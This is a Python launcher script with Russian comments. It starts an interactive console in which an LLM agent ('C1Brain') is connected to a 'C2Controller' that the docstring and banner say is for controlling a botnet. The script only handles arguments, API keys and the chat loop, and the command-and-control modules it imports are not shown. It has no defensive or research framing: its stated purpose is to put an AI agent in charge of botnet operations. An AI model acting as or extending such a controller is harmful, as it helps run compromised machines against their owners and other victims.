#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Скрипт для запуска LLM агента с интеграцией C1Brain и C2Controller.
Обеспечивает взаимодействие LLM агента с ботнетом через консольный интерфейс.
"""

import os
import sys
import json
import argparse
import asyncio
import logging
from typing import Dict, List, Any, Optional

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='c1_c2_agent.log'
)
logger = logging.getLogger('C1C2Agent')

# Импортируем необходимые модули
from core.c1_brain import C1Brain
from core.c2_controller import C2Controller, C2API
from init_c2_integration import IntegrationManager, init_integration

def setup_argparse():
    """Настройка парсера аргументов командной строки"""
    parser = argparse.ArgumentParser(description='Запуск LLM агента с интеграцией C1 и C2')
    
    parser.add_argument('--model', type=str, default='openai',
                        choices=['openai', 'anthropic', 'api'],
                        help='Модель LLM для использования: openai, anthropic или api')
    
    parser.add_argument('--api-key', type=str,
                        help='API ключ для LLM (если не указан, будет использован из .env)')
    
    parser.add_argument('--api-endpoint', type=str,
                        help='Эндпоинт API для LLM (для режима api)')
    
    parser.add_argument('--no-demo-agents', action='store_true',
                        help='Не создавать демонстрационных агентов при запуске')
    
    parser.add_argument('--log-level', type=str, default='INFO',
                        choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'],
                        help='Уровень логирования')
    
    return parser.parse_args()

async def interactive_session(c1_brain: C1Brain):
    """
    Запускает интерактивную сессию с LLM агентом
    
    Args:
        c1_brain: Экземпляр C1Brain
    """
    print("\n=== LLM Агент для управления ботнетом ===")
    print("Введите ваш запрос или команду. Для выхода введите 'exit' или 'quit'.\n")
    
    history = []
    
    while True:
        try:
            # Получаем ввод пользователя
            user_input = input("\n> ")
            
            # Проверка на выход
            if user_input.lower() in ['exit', 'quit', 'выход']:
                print("Завершение работы...")
                break
            
            # Обрабатываем запрос через C1Brain
            print("Обработка запроса...")
            response = await c1_brain.process_chat(user_input, history)
            
            # Выводим ответ агента
            print(f"\nАгент: {response}")
            
            # Обновляем историю
            history = c1_brain.session_context["conversation_history"]
            
        except KeyboardInterrupt:
            print("\nПрервано пользователем. Завершение работы...")
            break
        
        except Exception as e:
            logger.error(f"Error in interactive session: {e}")
            print(f"\nОшибка: {e}")

async def main():
    """Основная функция для запуска агента"""
    # Парсим аргументы командной строки
    args = setup_argparse()
    
    # Настраиваем логирование
    logging.getLogger().setLevel(getattr(logging, args.log_level))
    
    # Устанавливаем переменные окружения из аргументов
    if args.api_key:
        if args.model == 'openai':
            os.environ['OPENAI_API_KEY'] = args.api_key
        elif args.model == 'anthropic':
            os.environ['ANTHROPIC_API_KEY'] = args.api_key
    
    if args.api_endpoint and args.model == 'api':
        os.environ['LLM_API_ENDPOINT'] = args.api_endpoint
    
    # Создаем экземпляры C1Brain и C2Controller
    try:
        print("Инициализация компонентов...")
        
        # Создаем C1Brain с выбранной моделью LLM
        c1_brain = C1Brain(llm_provider=args.model)
        
        # Создаем C2Controller
        c2_controller = C2Controller()
        
        # Инициализируем интеграцию
        integration = init_integration(c1_brain, c2_controller)
        
        print("Компоненты инициализированы успешно")
        
        # Запускаем интерактивную сессию
        await interactive_session(c1_brain)
        
    except Exception as e:
        logger.error(f"Error initializing components: {e}")
        print(f"Ошибка при инициализации компонентов: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code) 